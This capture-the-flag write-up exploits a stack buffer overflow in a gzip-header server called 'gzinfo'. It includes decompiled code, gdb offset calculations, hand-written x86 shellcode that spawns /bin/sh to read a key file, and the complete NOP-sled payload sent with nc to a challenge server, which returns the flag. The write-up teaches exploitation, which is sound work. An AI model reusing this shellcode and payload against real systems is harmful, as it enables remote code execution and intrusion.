gzinfo
======

Background
----------
The goal was to retrieve the flag stored on the server

Tools used
----------
* IDA Pro
* `gdb`

Process
-------
Opening up the executable in IDA, I found that the function `handle` handled network connections and then called `get_header`, which I entered and got hexrays to decompile to:
````c
void *__stdcall get_header(void *dest, int fd)
{
  int v2; // eax@13
  int v3; // eax@13
  char buf2; // [sp+1Bh] [bp-13Dh]@9
  char buf[288]; // [sp+1Ch] [bp-13Ch]@1
  int receivedBytes; // [sp+13Ch] [bp-1Ch]@9

  myread(fd, buf, 10);
  if ( buf[3] & 2 )
    myread(fd, &buf[10], 2);
  if ( buf[3] & 4 )
  {
    myread(fd, &buf[12], 2);
    myread(fd, &buf[14], *(signed __int16 *)&buf[12]);
  }
  if ( buf[3] & 8 )
    *(_DWORD *)&buf[272] = readstr(fd);
  if ( buf[3] & 0x10 )
    *(_DWORD *)&buf[276] = readstr(fd);
  while ( 1 )
  {
    receivedBytes = recv(fd, &buf2, 1u, 0);
    if ( receivedBytes < 0 )
    {
      perror("recv");
      exit(1);
    }
    if ( !receivedBytes )
      break;
    *(_DWORD *)&buf[280] >>= 8;
    v2 = *(_DWORD *)&buf[280];
    *(_DWORD *)&buf[280] = (*(_DWORD *)&buf[284] << 24) | v2 & 0xFFFFFF;
    *(_DWORD *)&buf[284] >>= 8;
    v3 = *(_DWORD *)&buf[284];
    *(_DWORD *)&buf[284] = (buf2 << 24) | v3 & 0xFFFFFF;
  }
  memcpy(dest, buf, 288u);
  return dest;
}
````

The important lines here are:
````c
  if ( buf[3] & 4 )
  {
    myread(fd, &buf[12], 2);
    myread(fd, &buf[14], *(signed __int16 *)&buf[12]);
  }
````
which allows me to write an arbitrary number of bytes to the stack, as long as it was in the format:
````
aaa ; Padding
\x04
aaaaaa ; More padding
<Length of following data as a 2-byte LE integer>
<Data>
````

Looking at the stack:
````
-0000013D buf2            db ?
-0000013C buf             db 288 dup(?)
-0000001C receivedBytes   dd ?
-00000018 var_18          dd ?
-00000014 var_14          dd ?
-00000010 var_10          dd ?
-0000000C var_C           dd ?
-00000008 var_8           dd ?
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
````
Showed me that I had (288 - 10 - 2 = 276) bytes of data to work with without having it overwritten, and a total of (288 + 8*4 = 320) bytes needed to reach the return address.

Since the stack was executable, I am able to get it to return to an address on the stack, which fortunately the executable on the server outputs a reference value of 0xbffffaa0. That address points to the buffer outside of this stack frame, so I needed to know the difference to change it to within the `buf` variable, and the following `gdb` session shows how I did it:
````
$ gdb ./gzinfo
<snip>
(gdb) set follow-fork-mode child
(gdb) break get_header
Breakpoint 1 at 0x80489cb
(gdb) r
Starting program: /path/to/gzinfo
Listening on 0.0.0.0:1234
[New process 11279]
spawned child with pid = 11279
[Switching to process 11279]

Breakpoint 1, 0x080489cb in get_header ()
(gdb) disas get_header
Dump of assembler code for function get_header:
   0x080489c5 <+0>:	push   %ebp
   0x080489c6 <+1>:	mov    %esp,%ebp
   0x080489c8 <+3>:	push   %edi
   0x080489c9 <+4>:	push   %esi
   0x080489ca <+5>:	push   %ebx
=> 0x080489cb <+6>:	sub    $0x14c,%esp
   0x080489d1 <+12>:	movl   $0xa,0x8(%esp)
   0x080489d9 <+20>:	lea    -0x13c(%ebp),%eax
   0x080489df <+26>:	mov    %eax,0x4(%esp)
   0x080489e3 <+30>:	mov    0xc(%ebp),%eax
<snip>
(gdb) x/10xw $esp
0xffffcddc:	0xf7fb0000	0x00000000	0x00000000	0xffffd0d8
0xffffcdec:	0x08048ff6	0xffffcfa0	0x00000008	0xffffcf20
0xffffcdfc:	0xf7fe5ed9	0xffffcea8
````
The stack reference value it output was 0xffffcf20, the return address was at 0xffffcdec, and `buf` being -0x138 away from that. The address difference to `buf` was then (0xffffcdec - 0xffffcf20 - 0x138 = -0x26c). However, I needed and address at least 14 bytes past `buf`, where the input is written, so I chose a nice and round offset of -0x250.

For the "shell" code it was to execute, I modified one of my old shellcodes to call `cat key >&4`, since `key` was probably the file the flag was stored in judging from the file in pie.
````nasm
jmp $+5
pop eax
jmp eax
call $-3
mov esp, eax
add esp, 0x7f
add esp, 0x7f
xor eax, eax

mov dword ptr [esp], 0x6e69622f ; "/bin"
mov word ptr [esp+0x4], 0x732f ; "/s"
mov byte ptr [esp+0x6], 0x68 ; "h"
mov byte ptr [esp+0x7], al

mov dword ptr [esp+0xc], 0x4d524554 ; "TERM"
mov dword ptr [esp+0x10], 0x6574783d ; "=xte"
mov dword ptr [esp+0x14], eax
mov word ptr [esp+0x14], 0x6d72 ; "rm"

mov dword ptr [esp+0x18], eax
mov word ptr [esp+0x18], 0x632d ; "-c"

mov dword ptr [esp+0x1c], 0x20746163 ; "cat "
mov dword ptr [esp+0x20], 0x2079656b ; "key "
mov word ptr [esp+0x24], 0x263e ; ">&"
mov byte ptr [esp+0x26], 0x34 ; "4"
mov byte ptr [esp+0x27], al

mov ebx, esp
mov dword ptr [esp+0x28], esp
add ebx, 0x18
mov dword ptr [esp+0x2c], ebx
add ebx, 4
mov dword ptr [esp+0x30], ebx
mov dword ptr [esp+0x34], eax

lea ebx, [esp+0xc]
mov dword ptr [esp+0x38], ebx
mov dword ptr [esp+0x3c], eax

mov ebx, esp
lea ecx, [esp+0x28]
lea edx, [esp+0x38]
add eax, 0x0b
int 0x80
````
This "shellcode" essentially calls:
````cpp
execve("/bin/sh", {"/bin/sh", "-c", "cat key >&4", nullptr}, {"TERM=xterm", nullptr})
````
I know it is long and not the best way to do it, but it was the first way that came to mind when I wrote it originally half a year ago and I haven't been bothered to make it smaller yet.
Assembling that gives me this:
````
\xEB\x03\x58\xFF\xE0\xE8\xF8\xFF\xFF\xFF\x89\xC4\x83\xC4\x7F\x83\xC4\x7F\x31\xC0\xC7\x04\x24\x2F\x62\x69\x6E\x66\xC7\x44\x24\x04\x2F\x73\xC6\x44\x24\x06\x68\x88\x44\x24\x07\xC7\x44\x24\x0C\x54\x45\x52\x4D\xC7\x44\x24\x10\x3D\x78\x74\x65\x89\x44\x24\x14\x66\xC7\x44\x24\x14\x72\x6D\x89\x44\x24\x18\x66\xC7\x44\x24\x18\x2D\x63\xC7\x44\x24\x1C\x63\x61\x74\x20\xC7\x44\x24\x20\x6B\x65\x79\x20\x66\xC7\x44\x24\x24\x3E\x26\xC6\x44\x24\x26\x34\x88\x44\x24\x27\x89\xE3\x89\x64\x24\x28\x83\xC3\x18\x89\x5C\x24\x2C\x83\xC3\x04\x89\x5C\x24\x30\x89\x44\x24\x34\x8D\x5C\x24\x0C\x89\x5C\x24\x38\x89\x44\x24\x3C\x89\xE3\x8D\x4C\x24\x28\x8D\x54\x24\x38\x83\xC0\x0B\xCD\x80
````
It was only 164 bytes long so I needed to pad it with (288 - 14 - 164 = 110) NOPs to completely fill up `buf`. After that, I still needed (320 - 288 = 32) bytes of padding to be able to overwrite the return address.

The final input looked like this:
````
aaa ; Padding
\x04
aaaaaa ; More padding
\x36\x01 ; 110 + 164 + 32 + 4 = 310 = 0x136
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\xEB\x03\x58\xFF\xE0\xE8\xF8\xFF\xFF\xFF\x89\xC4\x83\xC4\x7F\x83\xC4\x7F\x31\xC0\xC7\x04\x24\x2F\x62\x69\x6E\x66\xC7\x44\x24\x04\x2F\x73\xC6\x44\x24\x06\x68\x88\x44\x24\x07\xC7\x44\x24\x0C\x54\x45\x52\x4D\xC7\x44\x24\x10\x3D\x78\x74\x65\x89\x44\x24\x14\x66\xC7\x44\x24\x14\x72\x6D\x89\x44\x24\x18\x66\xC7\x44\x24\x18\x2D\x63\xC7\x44\x24\x1C\x63\x61\x74\x20\xC7\x44\x24\x20\x6B\x65\x79\x20\x66\xC7\x44\x24\x24\x3E\x26\xC6\x44\x24\x26\x34\x88\x44\x24\x27\x89\xE3\x89\x64\x24\x28\x83\xC3\x18\x89\x5C\x24\x2C\x83\xC3\x04\x89\x5C\x24\x30\x89\x44\x24\x34\x8D\x5C\x24\x0C\x89\x5C\x24\x38\x89\x44\x24\x3C\x89\xE3\x8D\x4C\x24\x28\x8D\x54\x24\x38\x83\xC0\x0B\xCD\x80
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
\x80\xf8\xff\xbf ; 0xbffffaa0 - 0x250 = 0xbffff850
````
````
$ printf 'aaa\x04aaaaaa\x36\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x03\x58\xFF\xE0\xE8\xF8\xFF\xFF\xFF\x89\xC4\x83\xC4\x7F\x83\xC4\x7F\x31\xC0\xC7\x04\x24\x2F\x62\x69\x6E\x66\xC7\x44\x24\x04\x2F\x73\xC6\x44\x24\x06\x68\x88\x44\x24\x07\xC7\x44\x24\x0C\x54\x45\x52\x4D\xC7\x44\x24\x10\x3D\x78\x74\x65\x89\x44\x24\x14\x66\xC7\x44\x24\x14\x72\x6D\x89\x44\x24\x18\x66\xC7\x44\x24\x18\x2D\x63\xC7\x44\x24\x1C\x63\x61\x74\x20\xC7\x44\x24\x20\x6B\x65\x79\x20\x66\xC7\x44\x24\x24\x3E\x26\xC6\x44\x24\x26\x34\x88\x44\x24\x27\x89\xE3\x89\x64\x24\x28\x83\xC3\x18\x89\x5C\x24\x2C\x83\xC3\x04\x89\x5C\x24\x30\x89\x44\x24\x34\x8D\x5C\x24\x0C\x89\x5C\x24\x38\x89\x44\x24\x3C\x89\xE3\x8D\x4C\x24\x28\x8D\x54\x24\x38\x83\xC0\x0B\xCD\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\xf8\xff\xbf' | nc 54.252.227.181 1234
debug: stack is 0xbffffaa0
gzip header extractor
Send us a gzip and we'll send you some information about it.
e.g. nc 127.0.0.1 1234 < file.gz
1Kb48m2251rfCNsFKfuTVzN1grTQf7Xjke
````
